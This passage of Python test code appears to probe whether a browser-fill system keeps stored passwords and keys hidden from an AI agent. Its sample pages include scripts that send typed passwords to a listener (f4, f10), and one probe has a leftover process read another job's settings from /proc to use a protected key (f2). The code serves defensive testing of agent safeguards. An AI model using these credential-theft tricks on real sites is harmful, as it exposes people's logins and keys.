            said += (f"; answered clean: {after_answer.get('state')}, the snapshot holds no logins, profile or job logs and restores without them")
        elif ctx.split:
            held.append(f"no /migration ({status})")
        return bool(held), ("after the upgrade boot the home still holds: " + ", ".join(held) + "; " if held else
                            "the upgrade dropped the saved login and the cookie and held back the snapshot; ") + said
    finally:
        for name in made:
            ctx.remove(name)
        ctx.unvolume(vol)


def n6b(ctx):
    """In the general browser, on a localhost page that is not a signed-in
    site (port 8001), ask for the localhost passkey with a challenge the agent chose."""
    ctx.page()
    ctx.serve(8001)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8001/")
    # With no authenticator, Chromium's own dialog waits for a person past the
    # request's timeout; the request is aborted at 12 s so the probe answers.
    js = ("(async()=>{const c=new AbortController();setTimeout(()=>c.abort(),12000);"
          "try{const a=await navigator.credentials.get({signal:c.signal,publicKey:{challenge:new Uint8Array(32),"
          "rpId:'localhost',userVerification:'required',timeout:10000}});return 'OK '+a.id}"
          "catch(e){return 'ERR '+e.name+': '+(e.name==='AbortError'?'no authenticator answered in 12 s':e.message)}})()")
    res, _ = ctx.c.tool("browser", action="eval", js=js)
    return res.strip('"').startswith("OK"), "navigator.credentials.get in the general browser: " + res.strip('"')[:70]



# --- review of rc.2: findings 1-4 ---------------------------------------------------

def spelled_in(text, value):
    """Whether `text` carries `value` in any spelling a page, a URL or a form
    gives it: plain, percent- or form-encoded, HTML entities, base64."""
    seen = [text, urllib.parse.unquote(text), urllib.parse.unquote_plus(text), html.unescape(text),
            html.unescape(urllib.parse.unquote_plus(text)), urllib.parse.unquote_plus(html.unescape(text))]
    seen += decode_b64_lines(text)
    return any(value in t for t in seen)


def site_page(ctx, path, body, color="#ffff00"):
    ctx.c.tool("files", action="put", path="site/" + path,
               content=(f'<!doctype html><html><head><meta charset=utf-8></head><body style="margin:0;background:{color};'
                        f'min-height:100vh;font:20px monospace">{body}</body></html>'))


def refs_of(text):
    return {kind: ref for ref, kind in re.findall(r"\[(e\d+)\] \[(text|password|button|textbox)\]", text)}


def shot(ctx):
    blocks, _ = ctx.c.call("browser", action="screenshot")
    return ctx.c.image(blocks)


def f1a(ctx):
    """Finding 1 as the reviewer found it: a login's password typed into the
    plain text field of a GET form on its own site, the form sent, the
    address read back from `tabs`, then Back and a screenshot of the
    restored field (against the same page before anything was typed)."""
    import pixels
    ctx.page()
    # The field sits alone in a fixed white box; only that box is compared.
    site_page(ctx, "f1.html", '<form action="/f1-done.html" method=get style="margin:0;padding:40px">'
              '<input name=q type=text style="display:block;margin:0;padding:0;width:700px;height:40px;box-sizing:border-box;'
              'background:#fff;color:#000;border:0;outline:none;caret-color:transparent;font:20px monospace">'
              '<button style="margin-top:80px">go</button></form>')
    site_page(ctx, "f1-done.html", "<h1>searched</h1>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f1.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "text" not in refs:
        return "broken", "the page has no text field"
    empty = shot(ctx)
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["text"], secret="LOCALENC.password")
    ctx.c.tool("browser", action="click_ref", ref=refs["button"])
    time.sleep(1.5)
    # A look at the page it went to (which shows it again once it is a new
    # document), then the tab list with its address.
    landed, _ = ctx.c.tool("browser", action="text")
    tabs, _ = ctx.c.tool("browser", action="tabs")
    ctx.c.tool("browser", action="back")
    time.sleep(1.5)
    back = shot(ctx)
    text, _ = ctx.c.tool("browser", action="text")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    hits = []
    if spelled_in(tabs, K.LOCAL_ENC):
        hits.append("tabs shows the password in the address")
    if spelled_in(text, K.LOCAL_ENC) or spelled_in(landed, K.LOCAL_ENC):
        hits.append("text shows it")
    def field(png):
        width, _, rows = pixels.decode(png)
        bpp = len(rows[0]) // width
        return [r[44 * bpp:736 * bpp] for r in rows[44:76]]
    if back and empty and field(back) != field(empty):
        hits.append("the screenshot after Back shows the restored field")
    return bool(hits), ("; ".join(hits) if hits else
                        "fill: " + said.replace("\n", " ")[:110] + ("" if refused else " (typed)") +
                        "; tabs, text and the screenshot after Back show nothing of it (signed-in tabs: "
                        + "; ".join(str(t.get("url") or t.get("site")) for t in (json.loads(tabs) if tabs.startswith("[") else []) if t.get("signedIn"))[:160]
                        + "; after sending: " + landed.replace("\n", " ")[:160] + ")")


def f1b(ctx):
    """Finding 1, history: a password typed into a proper sign-in form,
    sent, then Back. If the page comes back with the field still holding the
    password, the tab must be hidden again. The page reports (to the host
    listener) only how long the field's value is at each pageshow."""
    ctx.page()
    beacon = f"http://{ctx.host}:{ctx.port}/f1b"
    site_page(ctx, "f1b.html", '<form action="/done" method=post><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>'
              f"<script>addEventListener('pageshow',e=>{{new Image().src='{beacon}?len='+"
              "document.querySelector('input[type=password]').value.length+'&persisted='+e.persisted+'&t='+Date.now()}})</script>",
              color="#00ff00")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f1b.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "password" not in refs:
        return "broken", "no password field"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
    if refused:
        return "broken", "the password was not typed into a proper sign-in form: " + said[:80]
    ctx.c.tool("browser", action="click_ref", ref=refs["button"])
    time.sleep(1.5)
    ctx.L.rows[:] = [r for r in ctx.L.rows if not r[0].startswith("/f1b")]
    ctx.c.tool("browser", action="back")
    time.sleep(2)
    image = shot(ctx)
    text, _ = ctx.c.tool("browser", action="text")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    lens = [int(m.group(1)) for path, _ in list(ctx.L.rows) for m in [re.search(r"len=(\d+)", path)] if path.startswith("/f1b") and m]
    restored = any(n > 0 for n in lens)
    shown = bool(image) or "[password]" in text
    if not restored:
        return False, f"Back did not bring the typed value back (pageshow lengths {lens}); nothing to hide"
    return shown, ("Back restored the typed password and the tab was shown again (screenshot "
                   + ("an image" if image else "withheld") + ")" if shown else
                   "Back restored the typed password and the tab stayed hidden")


def f1c(ctx):
    """Finding 1, redaction backstop: a sign-in page whose server answers
    with the password it was sent in percent, form, base64 and HTML-entity
    spellings, and one that sends it on in the next page's address. Neither
    `text` nor `tabs` may carry any spelling of it."""
    ctx.page()
    site_page(ctx, "f1c.html", '<form action="/echo" method=post><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>', color="#0000ff")
    site_page(ctx, "f1r.html", '<form action="/redirect" method=post><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>', color="#0000ff")
    site_page(ctx, "shown", "<h1>shown</h1>")
    hits, typed = [], []
    for page in ("f1c.html", "f1r.html"):
        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/" + page)
        refs = refs_of(ctx.c.tool("browser", action="text")[0])
        said, refused = ctx.c.tool("browser", action="fill", ref=refs.get("password", "e0"), secret="LOCALENC.password")
        typed.append(not refused)
        ctx.c.tool("browser", action="click_ref", ref=refs.get("button", "e0"))
        time.sleep(1.5)
        text, _ = ctx.c.tool("browser", action="text")
        tabs, _ = ctx.c.tool("browser", action="tabs")
        if spelled_in(text, K.LOCAL_ENC):
            hits.append(f"{page}: text carries a spelling")
        if spelled_in(tabs, K.LOCAL_ENC):
            hits.append(f"{page}: tabs carries a spelling")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if not all(typed):
        return "broken", "the password was not typed into the sign-in forms"
    return bool(hits), "; ".join(hits) or "neither the echo page nor the address carried any spelling of it"


def f2(ctx):
    """Finding 2: a process left behind by one job (a new session, so the
    job's group kill misses it) reads a later job's stand-in and proxy
    settings from /proc and uses them through the proxy while that job runs."""
    if not ctx.bound:
        return None, "needs a protected key (--delivery protected)"
    url = f"https://{ctx.host}:{ctx.bound.port}/j8"
    ctx.c.sh("rm -f ~/probe/j8.out")
    ctx.c.sh(f"python3 ~/{JOB} leftover {url} 25")
    time.sleep(4)
    ctx.c.tool("shell", action="start", command="exec env J8B=1 sleep 20", wait_ms=500)
    said = ""
    for _ in range(40):
        said = ctx.c.sh("cat ~/probe/j8.out 2>/dev/null")[0].strip()
        if said:
            break
        time.sleep(0.5)
    own, later = ctx.bound.heard("/j8a", only=[K.GH]), ctx.bound.heard("/j8b", only=[K.GH])
    used = own or later
    return used, ("the bound service received the real key from the leftover process ("
                  + ", ".join(w for w, u in (("its own ended job's authority", own), ("a later job's", later)) if u) + ")"
                  if used else "the bound service never received the key from it, by its ended job's authority or a later job's") + f" ({said or 'no answer'})"


def claim(c):
    """The desk's side of the attest (rc.3 on): the boot's key, taken once."""
    status, _, body = c.http("POST", "/capabilities/key")
    try:
        return status, json.loads(body)
    except Exception:
        return status, {}


def f3(ctx):
    """Finding 3: the capabilities attest. LEAKED when a holder of the bearer
    alone (which a job could read while the computer ran legacy) can make a
    proof the desk accepts: the bearer-keyed v1 form, a second claim of the
    boot's key, or a key a job can read. Also: the proof must cover the mode."""
    nonce = "f3-" + str(time.time())
    _, _, body = ctx.c.http("GET", "/capabilities?nonce=" + urllib.parse.quote(nonce))
    caps = json.loads(body)
    boot, attest, prot = caps.get("boot", ""), caps.get("attest") or "", caps.get("protected", {})
    v1 = base64.b64encode(hmac.new(ctx.token.encode(), f"hotline-broker-v1|{boot}|{nonce}".encode(),
                                   hashlib.sha256).digest()).decode()
    hits = []
    if prot.get("v") == 1 and attest == v1:
        hits.append("protected v1, attested with the bearer: whoever read the bearer can prove it")
    key = getattr(ctx, "attest_key", None)
    again, _ = claim(ctx.c)
    if again == 200:
        hits.append("the boot's key was handed out a second time")
    if key:
        mac = lambda mode: base64.b64encode(hmac.new(base64.b64decode(key), "|".join(
            ["hotline-broker-v2", boot, mode, caps.get("version", ""), nonce]).encode(), hashlib.sha256).digest()).decode()
        if attest != mac(prot.get("mode", "")):
            hits.append("the v2 attest does not verify")
        if attest == mac("legacy" if prot.get("mode") == "split" else "split"):
            hits.append("the attest does not cover the mode")
        out = job(ctx, "scan", key[::-1])
        m = re.search(r"SCAN logs=(\d+) environ=(\d+)", out)
        if not m or int(m.group(1)) + int(m.group(2)):
            hits.append("a job finds the key: " + out.strip()[:60])
    elif prot.get("v") != 1:
        hits.append("no key was claimed at start")
    return bool(hits), "; ".join(hits) or (f"protected v{prot.get('v')} {prot.get('mode')}: the attest verifies under the "
                                           "boot's key alone, covers the mode, a second claim is refused, no job reads the key")


def f4(ctx):
    """Finding 4: a login on a loopback site that was not granted readable.
    A job serves that site itself; its page's script reads what is typed and
    sends it to the host listener."""
    if ctx.delivery == "v1":
        return None, "v1 delivery: no login is protected; LOOPAPP comes with v2"
    beacon = f"http://{ctx.host}:{ctx.port}/f4"
    ctx.serve(8002)
    site_page(ctx, "f4.html", '<form action="/done" method=post><input name=u type=text>'
              '<input name=p type=password autocomplete=current-password><button>sign in</button></form>'
              "<script>const f=document.querySelector('input[type=password]');"
              f"setInterval(()=>{{if(f.value)new Image().src='{beacon}?v='+encodeURIComponent(f.value)}},200)</script>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8002/f4.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    said, refused = ctx.c.tool("browser", action="fill", ref=refs.get("password", "e0"), secret="LOOPAPP.password")
    time.sleep(2)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    got = any(K.LOOP_PASSWORD in urllib.parse.unquote(path) for path, _ in list(ctx.L.rows) if path.startswith("/f4"))
    _, _, body = ctx.c.http("GET", "/capabilities?nonce=f4")
    caps = json.loads(body).get("protected", {})
    info, _ = ctx.c.tool("state", action="info")
    labelled = caps.get("loopback") == "readable" and "LOOPAPP" in caps.get("readable", [])
    return got or not labelled, (("the job's page read LOOPAPP's password" if got else "fill: " + said.replace("\n", " ")[:100])
                 + f"; /capabilities protected={caps}" + ("" if labelled else " (no loopback label)"))


def f5(ctx):
    """Exact origins: LOCALAPP is granted for http://localhost:8000 alone. A
    page on a subdomain of it (sub.localhost:8000, the same server here) is
    where a delegated subdomain would get the parent's password."""
    ctx.page()
    site_page(ctx, "f5.html", '<form action="/done" method=post><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>')
    ctx.c.tool("browser", action="navigate", url="http://sub.localhost:8000/f5.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "password" not in refs:
        return "broken", "the subdomain page has no password field"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    return not refused, "fill LOCALAPP.password on sub.localhost:8000: " + said.replace("\n", " ")[:110]


def f8(ctx):
    """Revocation with an overlapping grant: the person shares a session on
    localhost:8000, which LOCALAPP's login also names, then revokes the
    share. The revoked session's cookie must be gone from the signed-in
    browser (a page there shows document.cookie)."""
    ctx.page()
    value = "hl-share-f8-" + str(int(time.time()))
    cookie = {"name": "f8sid", "value": value, "domain": "localhost", "path": "/", "secure": False,
              "httpOnly": False, "expires": time.time() + 86400}
    status, _, _ = ctx.c.http("PUT", "/sessions/f8share", {"sites": ["http://localhost:8000"], "cookies": [cookie], "storage": {}})
    if status != 200:
        return None, f"PUT /sessions answered {status}: no signed-in browser shares here"
    site_page(ctx, "f8.html", "<p id=c></p><script>document.getElementById('c').textContent='cookie='+document.cookie</script>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f8.html")
    before, _ = ctx.c.tool("browser", action="text")
    status, _, said = ctx.c.http("DELETE", "/sessions/f8share")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f8.html")
    after, _ = ctx.c.tool("browser", action="text")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if value not in before:
        return "broken", "the shared cookie never reached the page: " + before.replace("\n", " ")[:80]
    kept = value in after
    return kept, ("the revoked share's cookie is still sent to the site" if kept else
                  "the revoked share's cookie is gone though LOCALAPP still names the site") + f" (DELETE {status}: {said.decode()[:120]})"


def downloaded(ctx, value):
    """Whether a file in ~/Downloads named f6* holds exactly `value`, by its
    SHA-256: a tool's answer redacts a secret even in base64, so reading
    the file back through one would find nothing either way."""
    want = hashlib.sha256(value.encode()).hexdigest()
    out = ctx.c.sh("cd ~/Downloads 2>/dev/null && for f in f6*; do [ -f \"$f\" ] && sha256sum \"$f\"; done; true")[0]
    sums = re.findall(r"^([0-9a-f]{64})\s", out, re.M)
    return want in sums, (f"{len(sums)} file(s) there, none of them it" if sums else "none there")


def f6(ctx):
    """Downloads from a withheld page: the password is typed into a proper
    sign-in form, then the page's own link downloads a file holding the
    field's value (the site's script builds the link, as a page may). The
    file must not reach the agent's Downloads."""
    ctx.page()
    ctx.c.sh("rm -f ~/Downloads/f6*")
    site_page(ctx, "f6.html", '<form action="/done" method=post><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>'
              "<a id=dl href='/dl?v=' onclick=\"this.href='/dl?v='+encodeURIComponent(document.querySelector('input[type=password]').value)\">save a copy</a>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f6.html")
    text = ctx.c.tool("browser", action="text")[0]
    refs = refs_of(text)
    link = (re.search(r"\[(e\d+)\] \[link\] save a copy", text) or [None, None])[1]
    if "password" not in refs or not link:
        return "broken", "the page has no password field or link"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
    if refused:
        return "broken", "the password was not typed: " + said[:80]
    ctx.c.tool("browser", action="click_ref", ref=link)
    time.sleep(4)
    note, _ = ctx.c.tool("browser", action="text")
    got, files = downloaded(ctx, K.LOCAL_PASSWORD)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    said = re.search(r"[^\n]*f6\.txt[^\n]*", note)
    return got, ("the file with the typed password reached ~/Downloads" if got else
                 f"no file holding it reached ~/Downloads ({files})") + (f" ({said.group(0)[:110]})" if said else "")


# --- sign-in pages as real sites build them (rc.3 real-site QA) -------------

def f9(ctx):
    """A sign-in form a script builds with no method sends by GET (X's). The
    password is typed; if the browser sends the form itself (here there is no
    script to send it), the page load carrying the password must be stopped:
    the page it would load reports its address to the host listener, and
    `tabs` and `text` must carry no spelling of it."""
    if not ctx.split:
        return None, "the signed-in browser's rule; needs --split"
    ctx.page()
    beacon = f"http://{ctx.host}:{ctx.port}/f9"
    site_page(ctx, "f9.html", '<form action="/f9-done.html"><input name=u type=text>'
              '<input name=p type=password><button>sign in</button></form>')
    site_page(ctx, "f9-done.html", f"<h1>landed</h1><script>new Image().src='{beacon}?at='+encodeURIComponent(location.href)</script>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f9.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "password" not in refs:
        return "broken", "the page has no password field"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALENC.password")
    if refused:
        return "broken", "the password was not typed into its own site's GET form: " + said.replace("\n", " ")[:110]
    ctx.c.tool("browser", action="click_ref", ref=refs["button"])
    time.sleep(2)
    text, _ = ctx.c.tool("browser", action="text")
    tabs, _ = ctx.c.tool("browser", action="tabs")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    hits = []
    if any(spelled_in(path, K.LOCAL_ENC) for path, _ in list(ctx.L.rows) if path.startswith("/f9")):
        hits.append("the page loaded with the password in its address")
    if spelled_in(tabs, K.LOCAL_ENC):
        hits.append("tabs carries a spelling")
    if spelled_in(text, K.LOCAL_ENC):
        hits.append("text carries a spelling")
    return bool(hits), "; ".join(hits) or ("typed, then the load carrying it was stopped: " + text.replace("\n", " ")[:120])


def s1(ctx):
    """Google's shape: the identifier step, then a password field the page's
    script builds in the same document, in no form, sent by the script. The
    username and the password must be typed, and the password not read back
    from text, tabs or a screenshot."""
    if not ctx.split:
        return None, "the signed-in browser's rule; needs --split"
    ctx.page()
    site_page(ctx, "s1.html", '<div id=app><input id=u type=email aria-label="Email"><button id=next>Next</button></div>'
              "<script>next.onclick=()=>{const who=u.value;app.innerHTML='<p>'+who.replace(/</g,'')+'</p>"
              "<input id=p type=password aria-label=\"Enter your password\"><button id=go>Sign in</button>';"
              "go.onclick=()=>fetch('/done',{method:'POST',body:new URLSearchParams({u:who,p:p.value})})}</script>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/s1.html")
    text = ctx.c.tool("browser", action="text")[0]
    user = (re.search(r"\[(e\d+)\] \[email\]", text) or [None, None])[1]
    nxt = (re.search(r"\[(e\d+)\] \[button\] Next", text) or [None, None])[1]
    if not user or not nxt:
        return "broken", "the identifier step has no email field or Next"
    said, refused = ctx.c.tool("browser", action="fill", ref=user, secret="LOCALAPP.username")
    if refused:
        return "broken", "the username was not typed: " + said[:100]
    ctx.c.tool("browser", action="click_ref", ref=nxt)
    time.sleep(1)
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "password" not in refs:
        return "broken", "the password step never showed"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
    if refused:
        return "broken", "the password was not typed into a script-built field with no form: " + said.replace("\n", " ")[:110]
    text, _ = ctx.c.tool("browser", action="text")
    tabs, _ = ctx.c.tool("browser", action="tabs")
    image = shot(ctx)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    hits = [w for w, hit in (("text", spelled_in(text, K.LOCAL_PASSWORD)), ("tabs", spelled_in(tabs, K.LOCAL_PASSWORD)),
                             ("a screenshot", bool(image))) if hit]
    return bool(hits), ("read back from " + ", ".join(hits) if hits else
                        "typed into the script-built field; text, tabs and the screenshot are withheld")


def s2(ctx):
    """X's shape: the page adds its Continue button as the name is typed.
    Nothing about where the form sends changed, so the username stays typed."""
    if not ctx.split:
        return None, "the signed-in browser's rule; needs --split"
    ctx.page()
    site_page(ctx, "s2.html", '<form action="/done" method=post><input name=u type=text aria-label=Username '
              "oninput=\"if(!this.form.querySelector('button'))this.form.insertAdjacentHTML('beforeend','<button>Continue</button>')\"></form>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/s2.html")
    refs = refs_of(ctx.c.tool("browser", action="text")[0])
    if "text" not in refs:
        return "broken", "the page has no text field"
    said, refused = ctx.c.tool("browser", action="fill", ref=refs["text"], secret="LOCALAPP.username")
    text, _ = ctx.c.tool("browser", action="text")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if refused or "local-user" not in text:
        return "broken", "the username was not kept: " + said.replace("\n", " ")[:110]
    return False, "the username was typed and kept as the page added its button"



def f10(ctx):
    """An image button whose formaction sends its form to another site, into
    a frame (formtarget). form.elements never lists an image button, so the
    fill rule did not see it, and a frame's document request was judged by
    its address alone. a: the button is on the page when the fill is asked,
    and the page clicks it once something is typed: the fill must be
    refused. b: the page adds the button only after the password is typed
    (no fill rule sees ahead) and clicks it: the frame's POST must be
    stopped. Either way the host listener must never get the password."""
    if not ctx.split:
        return None, "the signed-in browser's rule; needs --split"
    ctx.page()
    target = f"http://{ctx.host}:{ctx.port}/f10"
    def button(part):
        return (f'<input type=image id=go alt=Go formaction="{target}{part}" formtarget=f10 '
                'style="width:80px;height:30px">')
    site_page(ctx, "f10a.html", '<form action="/done" method=post><input id=p name=p type=password>' + button("a")
              + "</form><iframe name=f10></iframe><script>p.addEventListener('input',"
              "()=>setTimeout(()=>go.click(),1500),{once:true})</script>")
    site_page(ctx, "f10b.html", '<form id=f action="/done" method=post><input id=p name=p type=password></form>'
              "<iframe name=f10></iframe><script>p.addEventListener('input',()=>setTimeout(()=>{"
              f"f.insertAdjacentHTML('beforeend',{json.dumps(button('b'))});go.click()}},1500),{{once:true}})</script>")
    said = {}
    for part in ("a", "b"):
        ctx.c.tool("browser", action="navigate", url=f"http://localhost:8000/f10{part}.html")
        refs = refs_of(ctx.c.tool("browser", action="text")[0])
        if "password" not in refs:
            return "broken", f"f10{part} has no password field"
        text, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
        said[part] = ("refused" if refused else "typed")
        time.sleep(3)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    got = [part for part in ("a", "b") if ctx.heard("/f10" + part, only=[K.LOCAL_PASSWORD])]
    if said["b"] != "typed":
        return "broken", "f10b's plain sign-in form was refused"
    return bool(got), ("the listener got the password from " + ", ".join(f"f10{p} ({said[p]})" for p in got) if got else
                       f"f10a: fill {said['a']}; f10b: typed, then the frame's POST elsewhere was stopped; the listener got nothing")


# --- Shield's review of rc.3: the extension's own fill (point 2) ---------------
#
# The person fills a login from the Hotline chip in the field, as they do in
# Open Browser (the site screen, split) or the desktop viewer (single-user).
# The page reports only the length of what its fields hold. Each probe first
# shows the agent could see the page once the person's own hold lapsed, so a
# BLOCKED is the fill's doing, not the person's.

X_FIELD = (40, 100, 400, 40)  # the password field: left, top, width, height (CSS px)
HOLD_LAPSES = 11  # the person's input holds the site (or the desktop) for 10 s


class Person:
    """The person at the desk, over a bare websocket in the viewer's
    protocol: the site screen (/sites/ws) on the split computer, the desktop
    viewer (/ws) on the single-user one."""

    def __init__(self, ctx, site="http://localhost:8000"):
        import os
        import socket
        import threading
        host, port = ctx.c.base.split("//")[1].split(":")
        path = (f"/sites/ws?site={urllib.parse.quote(site, safe='')}&token=" if ctx.split else "/ws?token=") + ctx.token
        self.s = socket.create_connection((host, int(port)), timeout=20)
        key = base64.b64encode(os.urandom(16)).decode()
        self.s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                        f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
        head = b""
        while b"\r\n\r\n" not in head:
            head += self.s.recv(1)
        if b" 101 " not in head.split(b"\r\n")[0]:
            raise RuntimeError("the person's screen refused: " + head.split(b"\r\n")[0].decode())

        def drain():  # frames, read and dropped so the screen never stalls
            try:
                while self.s.recv(1 << 20):
                    pass
            except OSError:
                pass
        threading.Thread(target=drain, daemon=True).start()
        self.send({"t": "control", "take": True})
        time.sleep(0.5)

    def send(self, message):
        import os
        data = json.dumps(message).encode()
        mask = os.urandom(4)
        header = bytes([0x81]) + (bytes([0x80 | len(data)]) if len(data) < 126 else bytes([0x80 | 126]) + len(data).to_bytes(2, "big"))
        self.s.sendall(header + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))

    def click(self, x, y):
        self.send({"t": "move", "x": int(x), "y": int(y)})
        time.sleep(0.15)
        self.send({"t": "button", "b": 1, "down": True})
        time.sleep(0.05)
        self.send({"t": "button", "b": 1, "down": False})

    def close(self):
        self.s.close()


def x_form(ctx, path, tag, action, method="post", color="#ff00ff", after=""):
    """A sign-in page at a fixed place: a username and a password field
    and a sign-in button, on `color`. It sends the host listener only the
    lengths its fields hold (/<tag>?p=&u=), on each change and each pageshow."""
    beacon = f"http://{ctx.host}:{ctx.port}/{tag}"
    box = "position:absolute;left:40px;width:400px;height:40px;box-sizing:border-box;margin:0;font:16px monospace"
    site_page(ctx, path, f'<form action="{action}" method={method} style="margin:0">'
              f'<input name=u type=text style="{box};top:40px">'
              f'<input name=p type=password style="{box};top:100px">'
              '<button style="position:absolute;left:40px;top:170px;width:120px;height:32px">sign in</button></form>'
              + after +
              "<script>(()=>{const u=document.querySelector('[name=u]'),p=document.querySelector('[name=p]');let last='';"
              f"const tell=(why)=>{{const now=p.value.length+'/'+u.value.length;if(why!=='tick'||now!==last){{last=now;"
              f"new Image().src='{beacon}?p='+p.value.length+'&u='+u.value.length+'&why='+why+'&t='+Date.now()}}}};"
              "addEventListener('pageshow',e=>tell(e.persisted?'show-cached':'show'));setInterval(()=>tell('tick'),250)})()</script>",
              color=color)


def x_lengths(ctx, tag):
    """The password lengths the page reported, in order."""
    return [int(m.group(1)) for path, _ in list(ctx.L.rows) if path.startswith(f"/{tag}?")
            for m in [re.search(r"[?&]p=(\d+)", path)] if m]


def x_offset(ctx):
    """Where the page's (0, 0) is on what the person's screen shows: the
    tab itself on the site screen, the browser's content on the display."""
    if ctx.split:
        return 0, 0
    out, _ = ctx.c.tool("browser", action="eval", js="JSON.stringify([screenX+(outerWidth-innerWidth)/2, screenY+outerHeight-innerHeight])")
    x, y = json.loads(json.loads(out) if out.startswith('"') else out)
    return x, y


def x_logins():
    return sorted(name for name, entry in K.SECRETS.items()
                  if isinstance(entry, dict) and "http://localhost:8000" in entry.get("sites", []))


def x_person_clicks_field(ctx):
    """The person clicks into the password field and leaves it; then their hold lapses."""
    ox, oy = x_offset(ctx)
    x, y, w, h = X_FIELD
    person = Person(ctx)
    person.click(ox + x + 60, oy + y + h / 2)
    time.sleep(1)
    person.close()
    time.sleep(HOLD_LAPSES)


def x_autofill(ctx, tag, login):
    """The person fills `login` from the chip in the password field: the
    field, the chip at its right edge, then the login's row in the list
    under it. Answers whether the page then held that password's length
    (truthy), or "refused" when the extension typed the username alone."""
    want = len(K.SECRETS[login]["password"])
    who = len(K.SECRETS[login]["username"])
    ox, oy = x_offset(ctx)
    x, y, w, h = X_FIELD
    row = x_logins().index(login)
    person = Person(ctx)
    person.click(ox + x + 60, oy + y + h / 2)
    time.sleep(1.5)
    person.click(ox + x + w - 17, oy + y + h / 2)
    time.sleep(1.2)
    # The list sits 4 px under the field, a 1 px border and 4 px padding in;
    # each row is 46.5 px (two lines and 7 px padding top and bottom).
    person.click(ox + x + w - 110, oy + y + h + 9 + 46.5 * row + 23)
    filled = False
    for _ in range(24):
        time.sleep(0.25)
        if want in x_lengths(ctx, tag):
            filled = True
            break
    if not filled and any(re.search(rf"[?&]u={who}&", path) for path, _ in list(ctx.L.rows) if path.startswith(f"/{tag}?")):
        filled = "refused"
    person.close()
    time.sleep(HOLD_LAPSES)
    return filled


def x_sees(ctx):
    """What the agent gets of the page now: the tab's screenshot and the
    display's capture (pixels of the page's colour in each), and `text`."""
    import pixels
    blocks, _ = ctx.c.call("browser", action="screenshot")
    tab_png = ctx.c.image(blocks)
    tab = pixels.count(pixels.decode(tab_png), pixels.magenta) if tab_png else 0
    blocks, _ = ctx.c.call("capture", mode="image")
    screen_png = ctx.c.image(blocks)
    screen = pixels.count(pixels.decode(screen_png), pixels.magenta) if screen_png else 0
    text, _ = ctx.c.tool("browser", action="text")
    return {"tab": tab, "screen": screen, "text": text}


def a3s_x(ctx):
    """A3s with the extension's fill: the person fills LOCALAPP from the chip
    on a magenta sign-in page. Until the page is left, neither the tab's
    screenshot nor a capture of the display may show it, nor `text` the form.
    Before the fill (the person only clicked the field) the agent must see
    the page one of those ways, or the probe cannot tell."""
    ctx.page()
    x_form(ctx, "a3x.html", "a3x", "/a3x-done")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/a3x.html")
    x_person_clicks_field(ctx)
    before = x_sees(ctx)
    if x_autofill(ctx, "a3x", "LOCALAPP") is not True:
        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
        return "broken", f"the extension's fill never reached the page (lengths {x_lengths(ctx, 'a3x')})"
    after = x_sees(ctx)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    seen = lambda v: [w for w, hit in (("the tab's screenshot", v["tab"] > 1000), ("the display's capture", v["screen"] > 1000),
                                       ("text", "[password]" in v["text"])) if hit]
    if not seen(before):
        return "broken", "before the fill the agent saw the page no way at all, so a withheld one says nothing"
    shown = seen(after)
    return bool(shown), (("after the person's fill the agent still saw the page in " + ", ".join(shown)) if shown else
                         f"before the fill the agent saw it in {', '.join(seen(before))}; after it, none of them showed it")


def f1a_x(ctx):
    """F1a and F1c with the extension's fill: LOCALENC (every character a URL,
    form or page spells another way) filled by the person into forms that
    send it on, sent by the agent: by GET to the same site, to a page that
    echoes it, and to one that redirects with it in the address. The page it
    lands on, `text` and `tabs` must carry no spelling of it."""
    ctx.page()
